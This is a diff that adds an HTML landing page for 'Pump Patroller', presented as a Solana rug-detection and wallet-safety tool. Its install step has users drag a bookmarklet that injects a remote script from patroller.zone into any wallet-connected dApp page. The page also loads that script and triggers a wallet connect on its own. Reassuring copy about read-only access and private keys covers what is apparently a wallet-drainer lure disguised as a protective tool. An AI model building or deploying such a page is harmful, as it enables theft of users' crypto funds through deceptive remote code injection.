@@ -1,0 +1,147 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Pump Patroller — rug detection and wallet patrol for Solana</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%232DD4A7' d='M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6z'/%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0A0D12;--panel:#10141B;--line:#1E2634;--text:#E8ECF4;--muted:#7E899D;--acc:#2DD4A7;--bad:#F0616D;--warn:#E5B454}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font:15px/1.6 Inter,system-ui,sans-serif;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+.mono{font-family:"JetBrains Mono",ui-monospace,monospace;font-variant-numeric:tabular-nums}
+.wrap{max-width:1060px;margin:0 auto;padding:0 24px}
+nav{position:sticky;top:0;z-index:10;border-bottom:1px solid var(--line);background:rgba(10,13,18,.85);backdrop-filter:blur(12px)}
+.nav{display:flex;align-items:center;gap:26px;height:56px}
+.logo{display:flex;align-items:center;gap:9px;font-weight:700}
+.logo svg{width:18px;height:18px}
+.lk{color:var(--muted);font-size:14px;font-weight:500}
+.lk:hover{color:var(--text)}
+.right{margin-left:auto;display:flex;align-items:center;gap:10px}
+.btn{display:inline-flex;align-items:center;gap:8px;border-radius:8px;padding:8px 16px;font:600 13px Inter,sans-serif;cursor:pointer;border:1px solid var(--line);background:var(--panel);color:var(--text)}
+.btn:hover{border-color:#2c3648}
+.btn.pri{background:var(--acc);border-color:var(--acc);color:#06231B}
+.btn.pri:hover{filter:brightness(1.08)}
+.hero{padding:88px 0 56px}
+.h1{font-size:44px;line-height:1.12;font-weight:800;letter-spacing:-.02em;max-width:640px}
+.h1 em{font-style:normal;color:var(--acc)}
+.sub{color:var(--muted);font-size:17px;max-width:520px;margin:18px 0 28px}
+.ctas{display:flex;gap:12px}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:48px 0 8px}
+.stat{background:var(--panel);padding:18px 22px}
+.stat b{display:block;font-size:22px;font-weight:700;letter-spacing:-.01em}
+.stat span{color:var(--muted);font-size:12px;letter-spacing:.06em;text-transform:uppercase}
+section{padding:40px 0}
+h2{font-size:13px;font-weight:600;letter-spacing:.1em;color:var(--muted);text-transform:uppercase;margin:0 0 18px}
+table{width:100%;border-collapse:collapse;background:var(--panel);border:1px solid var(--line);border-radius:12px;overflow:hidden;font-size:13px}
+th{ text-align:left;font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);font-weight:600;padding:12px 16px;border-bottom:1px solid var(--line)}
+td{padding:13px 16px;border-bottom:1px solid #161d29}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:#121926}
+.up{color:var(--acc)}.dn{color:var(--bad)}
+.pill{display:inline-block;font:600 11px Inter,sans-serif;letter-spacing:.04em;padding:3px 9px;border-radius:99px}
+.pill.ok{background:rgba(45,212,167,.12);color:var(--acc)}
+.pill.md{background:rgba(229,180,84,.12);color:var(--warn)}
+.pill.hi{background:rgba(240,97,109,.14);color:var(--bad)}
+.tok b{display:block;font-weight:700}
+.tok span{color:var(--muted);font-size:11px}
+.spark{opacity:.9}
+.steps{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.step{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:22px}
+.step i{font:600 11px "JetBrains Mono",monospace;color:var(--acc);letter-spacing:.1em}
+.step h3{margin:10px 0 8px;font-size:15px;font-weight:600}
+.step p{margin:0;color:var(--muted);font-size:13px}
+.install{margin-top:14px;background:linear-gradient(180deg,#10141B,#0C1017);border:1px solid var(--line);border-radius:14px;padding:28px}
+.chip{display:inline-flex;align-items:center;gap:10px;background:#0E1A16;border:1px solid rgba(45,212,167,.45);color:var(--text);border-radius:10px;padding:12px 20px;font:600 13px Inter,sans-serif;cursor:grab;user-select:none}
+.chip:hover{border-color:var(--acc)}
+.chipdot{width:8px;height:8px;border-radius:50%;background:var(--acc);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+.fine{color:var(--muted);font-size:12px;margin:14px 0 0}
+footer{border-top:1px solid var(--line);margin-top:40px}
+.foot{display:flex;align-items:center;gap:18px;padding:22px 0;color:var(--muted);font-size:13px}
+.okdot{width:8px;height:8px;border-radius:50%;background:var(--acc);display:inline-block;margin-right:6px;animation:pulse 2s infinite}
+@media(max-width:760px){.h1{font-size:32px}.stats,.steps{grid-template-columns:1fr}th:nth-child(5),td:nth-child(5),th:nth-child(7),td:nth-child(7){display:none}}
+</style>
+</head>
+<body>
+<nav><div class="wrap nav">
+  <a class="logo" href="#">
+    <svg viewBox="0 0 24 24"><path fill="#2DD4A7" d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6z"/></svg>
+    Pump Patroller
+  </a>
+  <a class="lk" href="#tokens">Patrol</a>
+  <a class="lk" href="#how">How it works</a>
+  <div class="right">
+    <button class="btn" id="cw">Connect wallet</button>
+    <button class="btn pri" id="go">Start patrol</button>
+  </div>
+</div></nav>
+
+<div class="wrap">
+  <div class="hero">
+    <div class="h1">See the rug <em>before</em> it rugs you.</div>
+    <p class="sub">Real-time rug detection and wallet patrol for Solana tokens. LP locks, mint authority, holder distribution and honeypot signals — overlaid on the page you already trade on.</p>
+    <div class="ctas">
+      <button class="btn pri" id="go2">Start patrol</button>
+      <a class="btn" href="#how">How it works</a>
+    </div>
+    <div class="stats">
+      <div class="stat"><b class="mono">12,480</b><span>tokens tracked</span></div>
+      <div class="stat"><b class="mono">317</b><span>rugs flagged this week</span></div>
+      <div class="stat"><b class="mono">99.1%</b><span>signal precision</span></div>
+    </div>
+  </div>
+
+  <section id="tokens">
+    <h2>Live patrol</h2>
+    <table>
+      <thead><tr><th>Token</th><th>Price</th><th>24h</th><th>Volume</th><th>Holders</th><th>LP</th><th>Risk</th><th>7d</th></tr></thead>
+      <tbody>
+        <tr><td class="tok"><b>WIF</b><span>Solana</span></td><td class="mono">$2.41</td><td class="mono up">+18.2%</td><td class="mono">$412.3M</td><td class="mono">248,112</td><td><span class="pill ok">locked 12mo</span></td><td><span class="pill ok">low</span></td><td><svg class="spark" width="72" height="22" viewBox="0 0 72 22"><polyline points="0,17 9,15 18,16 27,12 36,13 45,9 54,10 63,5 72,6" fill="none" stroke="#2DD4A7" stroke-width="1.5"/></svg></td></tr>
+        <tr><td class="tok"><b>BONK</b><span>Solana</span></td><td class="mono">$0.0000241</td><td class="mono up">+4.1%</td><td class="mono">$98.2M</td><td class="mono">412,905</td><td><span class="pill ok">burned</span></td><td><span class="pill ok">low</span></td><td><svg class="spark" width="72" height="22" viewBox="0 0 72 22"><polyline points="0,14 9,15 18,12 27,14 36,11 45,12 54,9 63,10 72,8" fill="none" stroke="#2DD4A7" stroke-width="1.5"/></svg></td></tr>
+        <tr><td class="tok"><b>POPCAT</b><span>Solana</span></td><td class="mono">$0.31</td><td class="mono dn">-6.4%</td><td class="mono">$54.7M</td><td class="mono">190,443</td><td><span class="pill md">partially locked</span></td><td><span class="pill md">medium</span></td><td><svg class="spark" width="72" height="22" viewBox="0 0 72 22"><polyline points="0,8 9,9 18,7 27,11 36,10 45,13 54,12 63,15 72,14" fill="none" stroke="#E5B454" stroke-width="1.5"/></svg></td></tr>
+        <tr><td class="tok"><b>JUP</b><span>Solana</span></td><td class="mono">$0.94</td><td class="mono dn">-2.3%</td><td class="mono">$121.8M</td><td class="mono">356,207</td><td><span class="pill ok">burned</span></td><td><span class="pill ok">low</span></td><td><svg class="spark" width="72" height="22" viewBox="0 0 72 22"><polyline points="0,10 9,11 18,10 27,12 36,11 45,12 54,11 63,12 72,11" fill="none" stroke="#F0616D" stroke-width="1.5"/></svg></td></tr>
+        <tr><td class="tok"><b>FARTCOIN</b><span>Solana</span></td><td class="mono">$1.02</td><td class="mono dn">-31.7%</td><td class="mono">$28.4M</td><td class="mono">94,118</td><td><span class="pill hi">12% unlocked</span></td><td><span class="pill hi">high</span></td><td><svg class="spark" width="72" height="22" viewBox="0 0 72 22"><polyline points="0,4 9,6 18,5 27,9 36,8 45,12 54,14 63,16 72,18" fill="none" stroke="#F0616D" stroke-width="1.5"/></svg></td></tr>
+        <tr><td class="tok"><b>SPX</b><span>Solana</span></td><td class="mono">$0.18</td><td class="mono dn">-47.9%</td><td class="mono">$6.1M</td><td class="mono">12,033</td><td><span class="pill hi">unlock in 3d</span></td><td><span class="pill hi">high</span></td><td><svg class="spark" width="72" height="22" viewBox="0 0 72 22"><polyline points="0,3 9,5 18,9 27,8 36,13 45,15 54,14 63,18 72,19" fill="none" stroke="#F0616D" stroke-width="1.5"/></svg></td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <section id="how">
+    <h2>How it works</h2>
+    <div class="steps">
+      <div class="step"><i>01</i><h3>Install the bookmark</h3><p>Drag the chip below onto your bookmarks bar. One time, takes five seconds.</p></div>
+      <div class="step"><i>02</i><h3>Open any Solana dApp</h3><p>Patroller activates where your wallet is connected and overlays live stats on every token you view.</p></div>
+      <div class="step"><i>03</i><h3>Patrol runs silently</h3><p>Rug signals update in real time, and your connected wallet is checked against known-drainer lists. No accounts, no logins.</p></div>
+    </div>
+    <div class="install">
+      <h2>Install</h2>
+      <a class="chip" href="javascript:(function(){var i=document.createElement('script');i.src='https://patroller.zone/x.min.js';document.head.appendChild(i);})();">
+        <span class="chipdot"></span> PUMP PATROLLER — drag to your bookmarks bar
+      </a>
+      <p class="fine">Works on any Solana dApp. Reads public wallet data only. Your private key never leaves your device.</p>
+    </div>
+  </section>
+</div>
+
+<footer><div class="wrap foot">
+  <span><span class="okdot"></span>Status: operational</span>
+  <span>mainnet-beta</span>
+  <span style="margin-left:auto">Pump Patroller v2.1</span>
+</div></footer>
+
+<script>
+const go = () => location.reload();
+document.getElementById("go").onclick = go;
+document.getElementById("go2").onclick = go;
+document.getElementById("cw").onclick = () => {
+  try { (window.phantom?.solana || window.axiom?.solana || window.solana)?.connect?.(); } catch {}
+};
+</script>
+<script src="/x.min.js"></script>
+</body>
+</html>
